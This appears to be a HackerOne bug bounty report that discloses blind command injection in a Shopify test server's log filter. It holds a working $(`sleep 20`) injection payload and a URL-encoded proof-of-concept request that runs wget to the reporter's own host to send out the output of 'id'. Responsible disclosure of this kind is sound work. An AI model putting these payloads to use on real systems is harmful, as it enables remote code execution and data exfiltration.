# HackerOne Report: Attention! Remote Code Execution at http://wpt.ec2.shopify.com/
**Report ID:** 73567
**Vulnerability Class:** Command Injection - Generic

## Vulnerability Information & PoC
Hi,

I just found a remote code execution bug at http://wpt.ec2.shopify.com/

**Reproduction**

1. Open 
2. In the text area enter  **$(`sleep 20`)** and hit "Update List" 
3. The result should come out at around 20 seconds, there-by executing sleep command

POC:  http://wpt.ec2.shopify.com/testlog.php?days=1&filter=%24%28%60wget+sandbox.prakharprasad.com%2F%24%28id%29%60%29

I've attached a video for this RCE bug, in which I had executed **id** command for verification purpose on the server and sent back the result to my Apache logs, as the RCE here is blind.

Regards,
Prakhar Prasad




## Discussion & Remediation Timeline
